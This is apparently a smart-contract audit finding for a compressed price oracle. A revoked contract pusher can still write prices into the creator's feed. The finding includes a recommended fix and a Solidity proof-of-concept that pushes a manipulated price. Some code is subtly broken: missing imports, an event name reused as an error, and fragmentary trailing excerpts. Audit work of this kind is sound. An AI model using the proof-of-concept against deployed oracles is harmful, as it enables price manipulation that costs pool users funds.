### Title
Revoked Contract Pusher Can Still Feed Prices After `isPusher` Returns False — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowContractPushers` proves consent via a **live** `isPusher(creator)` staticcall at delegation time and records `namespaceRemapping[pusher] = creator`. The `fallback()` push path reads only `namespaceRemapping[msg.sender]` and **never re-checks** `isPusher`. If the pusher contract later revokes consent (its `isPusher` now returns `false`), the stale mapping persists and the pusher can still write arbitrary prices into the creator's namespace — the exact analog of disabled collateral still being usable to mint debt.

---

### Finding Description

`allowContractPushers` is the contract-pusher delegation path. Its NatSpec explicitly states the design rationale:

> "Contract-pusher variant: consent is proven by a LIVE `isPusher(creator)` staticcall instead of a signature, so there is nothing to replay and no deadline is needed." [1](#0-0) 

The live check is performed once at delegation time:

```solidity
(bool ok, bytes memory res) = pusher.staticcall(
    abi.encodeWithSignature("isPusher(address)", msg.sender)
);
require(ok);
bool allowed = abi.decode(res, (bool));
require(allowed);
namespaceRemapping[pusher] = msg.sender;
``` [2](#0-1) 

The `fallback()` push path, however, only reads the stored mapping and **never re-invokes `isPusher`**:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [3](#0-2) 

After resolving the namespace, the fallback writes the price slot with only a timestamp-monotonicity guard — no re-check of `isPusher`: [4](#0-3) 

This is structurally identical to the PaprController bug: the access-control check (`isAllowed` / `isPusher`) is enforced at the **entry** operation (add collateral / delegate pusher) but is absent at the **consumption** operation (mint debt / push price).

The `revokePusher()` self-revocation and `removePushers()` creator-revocation functions both clear `namespaceRemapping` explicitly. Neither is called automatically when `isPusher` changes state. The creator has no on-chain signal that the pusher's consent has been withdrawn; they must independently discover the state change and call `removePushers`. [5](#0-4) 

---

### Impact Explanation

A contract pusher whose `isPusher(creator)` now returns `false` retains the ability to call the `fallback()` and write any price value (subject only to timestamp monotonicity and the `MAX_TIME_DRIFT` future-timestamp cap) into the creator's feed slots. Those slots are read by `getOracleData` / `price`, which are consumed by `PriceProvider._getBidAndAskPrice` and `AnchoredPriceProvider._readLeg` to produce the bid/ask quotes delivered to pool swaps. [6](#0-5) [7](#0-6) 

A manipulated price pushed by the stale-but-still-mapped pusher reaches the pool's swap math directly, satisfying the **bad-price execution** impact gate: a trader receives more output than the oracle curve permits, or the pool receives less input than owed.

---

### Likelihood Explanation

The trigger is a **semi-trusted** actor (a contract pusher that was legitimately delegated) whose on-chain consent signal (`isPusher`) has changed to `false` — for example:

- The pusher contract's admin transfers ownership or upgrades the contract, and the new logic sets `isPusher(creator) = false` to signal withdrawal of consent.
- The creator observes `isPusher` returning `false` and incorrectly concludes the pusher is inactive, while the pusher contract (or a compromised key controlling it) continues to call the `fallback()`.

No privileged oracle-admin action is required. The creator's only recourse is to call `removePushers`, but the design comment implies `isPusher` returning `false` is itself the revocation signal — creating a false sense of security.

---

### Recommendation

Re-verify `isPusher` at push time inside `fallback()`. After resolving the namespace, if `namespaceRemapping[msg.sender] != address(0)` (i.e., the sender is a delegated contract pusher), perform a live staticcall to confirm consent is still active. If `isPusher` returns `false`, either revert or automatically clear `namespaceRemapping[msg.sender]` (self-revoke) before rejecting the push:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator != address(0)) {
    // Re-verify live consent; auto-revoke if withdrawn.
    (bool ok, bytes memory res) = msg.sender.staticcall(
        abi.encodeWithSignature("isPusher(address)", creator)
    );
    if (!ok || !abi.decode(res, (bool))) {
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
        revert PusherRevoked(msg.sender, creator); // or simply return
    }
}
```

Alternatively, document explicitly that `isPusher` returning `false` does **not** revoke the delegation and that creators must call `removePushers` to enforce revocation.

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";

contract MockContractPusher {
    address public owner;
    mapping(address => bool) public pusherAllowed;

    constructor(address _owner) { owner = _owner; }

    function isPusher(address creator) external view returns (bool) {
        return pusherAllowed[creator];
    }

    function setIsPusher(address creator, bool allowed) external {
        require(msg.sender == owner);
        pusherAllowed[creator] = allowed;
    }

    // Push a price slot into the oracle
    function pushPrice(address oracle, uint256 slotWord) external {
        (bool ok,) = oracle.call(abi.encodePacked(slotWord));
        require(ok);
    }
}

contract PoCTest {
    function test_revokedContractPusherCanStillPush() external {
        CompressedOracleV1 oracle = new CompressedOracleV1(address(this), 60_000);
        MockContractPusher pusher = new MockContractPusher(address(this));

        // 1. Grant consent: isPusher returns true
        pusher.setIsPusher(address(this), true);

        // 2. Delegate the contract pusher
        address[] memory pushers = new address[](1);
        pushers[0] = address(pusher);
        oracle.allowContractPushers(pushers);

        // 3. Revoke consent: isPusher now returns false
        pusher.setIsPusher(address(this), false);
        // Creator believes pusher is inactive — but namespaceRemapping still maps it.

        // 4. Pusher pushes a manipulated price (timestamp = block.timestamp, slotId = 0)
        uint256 manipulatedPrice = 0xDEADBEEF; // arbitrary price bits
        uint256 ts = block.timestamp * 1000; // milliseconds
        uint256 slotWord = (manipulatedPrice << 64) | (ts << 8) | 0; // slotId=0
        pusher.pushPrice(address(oracle), slotWord);

        // 5. Price is now stored in creator's namespace — no revert occurred.
        bytes32 feedId = oracle.feedIdOf(address(this), 0, 0);
        IOffchainOracle.OracleData memory data = oracle.getOracleData(feedId);
        // data.price reflects the manipulated push — test passes when it should have reverted.
        assert(data.timestampMs != TimeMs.wrap(0));
    }
}
```

The test passes (no revert) even though `isPusher(creator)` returns `false` at push time, demonstrating that a revoked contract pusher can still write prices into the creator's namespace and from there into any pool consuming that feed.

    /// @notice Contract-pusher variant: consent is proven by a LIVE `isPusher(creator)`
    ///         staticcall instead of a signature, so there is nothing to replay and no
    ///         deadline is needed.
    function allowContractPushers(address[] calldata pushers) external {
        uint256 l = pushers.length;
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            (bool ok, bytes memory res) = pusher.staticcall(abi.encodeWithSignature("isPusher(address)", msg.sender));
            require(ok);
            bool allowed = abi.decode(res, (bool));
            require(allowed);

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }

        address creator = namespaceRemapping[msg.sender];

    function removePushers(address[] calldata pushers) external {
        uint256 l = pushers.length;
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];
            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

                namespaceRemapping[pusher] = address(0);
                emit PusherRevoked(pusher, msg.sender);

                revert InvalidManager(msg.sender);

    function _readLeg(bytes32 feedId)
        internal returns (uint256 mid, uint256 spreadBps, uint256 refTime, bool ok)
    {
        (mid, spreadBps, , refTime) = IPricedOracle(address(offchainOracle)).price(feedId, msg.sender);

        // Stale reference → not ok. Clamping to a stale anchor is the one false-safety case.
        if (_isStale(refTime, block.timestamp, MAX_REF_STALENESS)) return (mid, spreadBps, refTime, false);

        // Basic validity — mid positive, spreadBps not the stalled/off-hours marker (the Chainlink oracle
        // writes spreadBps = ORACLE_BPS when an RWA market is closed).
        if (mid == 0 || spreadBps >= ORACLE_BPS) return (mid, spreadBps, refTime, false);

        // Per-leg price guard.
        (uint128 guardMin, uint128 guardMax) = offchainOracle.priceGuard(feedId);
        guardMax = guardMax == 0 ? type(uint128).max : guardMax;
        if (mid < guardMin || mid > guardMax) return (mid, spreadBps, refTime, false);

        ok = true;
